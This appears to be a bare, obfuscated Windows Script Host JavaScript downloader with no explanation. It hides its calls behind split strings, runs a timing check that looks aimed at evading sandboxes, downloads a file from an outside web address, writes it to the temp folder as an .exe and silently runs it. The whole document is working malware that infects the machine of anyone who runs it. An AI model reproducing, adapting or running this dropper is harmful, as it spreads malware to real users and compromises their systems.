var FB = false;
var DG = "Create"+"Object";
var ZN = function B() {return WScript[DG]("WScript"+".Shell");}(), R = 11;
var QP = "MSXML2"+".XMLHTTP";
var G0 = 2;
var PJ = G0 - 2;
function B0(F){ZN["Run"](F, PJ, PJ);};
function JY0(){return QP + "";};
function SM(GG, K0){PJ = PJ * 1; return GG - K0;};
function G(){return DG;};
/*@cc_on
  @if (@_win32 || @_win64)
    FB = true;
  @end
@*/
if (FB)
{
var FR = "";
function HT(){return 22;};
var N0 = 0; var YK = 0;
function N()
{
var T0 = new this["Date"]();
var FQ = T0["getUTCMilliseconds"]();
WScript["Sleep"](HT());
var T0 = new this["Date"]();
var OK = T0["getUTCMilliseconds"]();
WScript["Sleep"](HT());
var T0 = new this["Date"]();
var Y = T0["getUTCMilliseconds"]();
var N0 = "X";
N0 = SM(OK, FQ);
var YK = "PJ0";
YK = SM(Y, OK);
FR = "open";
return SM(N0, YK);
}
var KJ = false;
var E0 = false;
for (var H = PJ; H < HT() * 1; H++){if (N() != PJ){
KJ = true; 
YK = "31" + 11 * N0 + YK; 
E0 = true; 
break;
}}
function Q() {return ((KJ == true) && (KJ == E0)) ? 1 : PJ;};
if (KJ && Q() && E0){
function JY() {return ZN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "c4DpbtppLc4YHgf.ex" + "e";};
 S = JY0();
 D = WScript[DG](S);
 var JD = 1;
do { 
	for (;JD;){
	try {
		if (JD == 1)
		{
			D[FR]("GET", "http://buygrocery.nz/l7dsp", false);
			D["send"]();
			T = "Sleep";
			JD = 2;
		}
		WScript[T](HT() + 120); 
		if (D["readystate"] < 2 * 2) continue;
		JD = PJ;
		function K(EF) {var E = (1, 2, 3, 4, 5, EF); return E;};
		S0 = WScript[G()]("ADODB.Stream");
		S = S0;
		S[FR]();
		S["type"] = K(1);
		S["write"](D["ResponseBody"]);
		S0["position"] = K(PJ);
		S["Save" + "ToFile"](JY(), 2);
		S0["cl"+"ose"]();
		MS = JY();
		B0(MS);
	} catch(YF){};};
}while (JD);
}
}

